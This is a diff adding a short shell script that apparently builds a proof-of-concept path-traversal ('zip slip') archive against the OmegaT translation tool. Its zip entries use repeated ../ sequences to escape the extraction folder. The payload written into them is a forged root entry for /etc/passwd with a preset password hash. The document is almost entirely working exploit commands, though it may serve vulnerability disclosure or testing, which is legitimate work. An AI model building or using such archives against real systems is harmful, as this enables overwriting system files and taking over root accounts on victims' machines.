@@ -1,0 +1,13 @@
+# Take a working archive such as DogeCoinFlag-1.01.zip
+# Extract it
+
+# Prepare the PoC ZIP file
+mkdir -p /tmp/PoC/a/b/c/d/e/f/omegat-MED/doc/main/ar-LB/
+mkdir -p /tmp/PoC/a/b/c/d/e/f/omegat-MED/doc/main/uk-UA/
+mkdir -p /tmp/PoC/tmp/etc
+touch /tmp/PoC/tmp/etc/passwd_exploit
+echo 'root:$y$j9T$DIY6c2NJkndsv.tKCSeRb.$GS4nNhD9SE.naXY2e/cTUMESPZOImWSXS9cSbfwUzaB:0:0:root:/root:/bin/bash' > /tmp/PoC/tmp/etc/passwd_exploit
+cp ~/Documents/omegat-MED.zip /tmp/PoC/a/b/c/d/e/f/omegat-MED.zip
+cd /tmp/PoC/a/b/c/d/e/f
+zip -r omegat-MED.zip omegat-MED/doc/main/ar-LB/../../../../../../../../../../tmp/etc/passwd_exploit
+zip -r omegat-MED.zip omegat-MED/doc/main/uk-UA/../../../../../../../../../../tmp/etc/passwd_exploit
